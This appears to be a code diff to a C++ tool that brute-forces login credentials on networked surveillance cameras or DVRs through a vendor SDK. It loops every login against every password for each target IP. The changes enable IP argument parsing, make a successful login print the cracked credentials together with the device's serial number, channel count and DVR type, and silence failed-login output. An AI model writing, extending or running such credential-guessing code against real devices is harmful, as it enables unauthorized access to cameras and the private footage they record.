@@ -62,7 +62,7 @@ static error_t parse_opt(int key, char *arg, struct argp_state *state) {
     sscanf(arg, "%u", &arguments->verbosity);
     break;
   case ARGP_KEY_ARG:
-    //ips.push_back(std::string(arg));
+    ips.push_back(std::string(arg));
 
     return 0;
   default:
@@ -127,7 +127,6 @@ void bruteforce()
     // TODO:
     //   We need to make something like single RTSP ping here to detect dead cameras
 
-
     for (const auto &login : logins)
     {
       for (const auto &password : passwords)
@@ -172,7 +171,11 @@ void bruteforce()
         if (login_success)
         {
           if (PRINT_RESULT)
-            std::cout << "Login success: " << login << ":" << password << "@" << ip << " (channels: " << (int) device_info.byChanNum << ")" << std::endl;
+            std::cout << "Login success: " << login << ":" << password << "@" << ip
+                      << "channels: " << (int) device_info.byChanNum << ", "
+                      << "zero_channel: " << (int) device_info.byStartChan << ", "
+                      << "serial: \"" << device_info.sSerialNumber << "\", "
+                      << "DVR type: " << (int) device_info.byDVRType << std::endl;
 
           NET_DVR_Cleanup();
           
@@ -188,10 +191,10 @@ void bruteforce()
           // READ UPD DOWN THERE \ /
           //                      V
 
-          int error = NET_DVR_GetLastError();
+          // int error = NET_DVR_GetLastError();
 
-          if (PRINT_EVERYTHING)
-            std::cout << "Login failed. Error code: " << error << std::endl;
+          // if (PRINT_EVERYTHING)
+          //   std::cout << "Login failed. Error code: " << error << std::endl;
 
           NET_DVR_Cleanup();
 
